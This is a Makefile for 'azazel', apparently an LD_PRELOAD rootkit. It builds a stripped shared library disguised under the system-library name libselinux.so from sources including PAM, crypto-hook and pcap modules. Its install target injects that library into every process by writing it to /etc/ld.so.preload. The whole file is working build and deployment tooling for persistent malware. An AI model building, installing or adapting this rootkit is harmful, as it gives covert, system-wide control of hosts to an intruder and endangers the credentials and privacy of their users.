INSTALL=/lib

CFLAGS+= -Wall
LDFLAGS+= -lc -ldl -lpam -lutil

all: config libselinux.so

client:
	$(CC) -fPIC client.c -shared -o client.so

config:
	@python config.py > const.h

libselinux.so: azazel.c pam.c xor.c crypthook.c pcap.c
	$(CC) -fPIC -g -c azazel.c pam.c xor.c crypthook.c pcap.c
	$(CC) -fPIC -shared -Wl,-soname,libselinux.so azazel.o xor.o pam.o crypthook.o pcap.o $(LDFLAGS) -o libselinux.so
	strip libselinux.so

install: all
	@echo [-] Initiating Installation Directory $(INSTALL)
	@test -d $(INSTALL) || mkdir $(INSTALL)
	@echo [-] Installing azazel 
	@install -m 0755 libselinux.so $(INSTALL)/
	@echo [-] Injecting azazel
	@echo $(INSTALL)/libselinux.so > /etc/ld.so.preload

clean:
	rm libselinux.so *.o

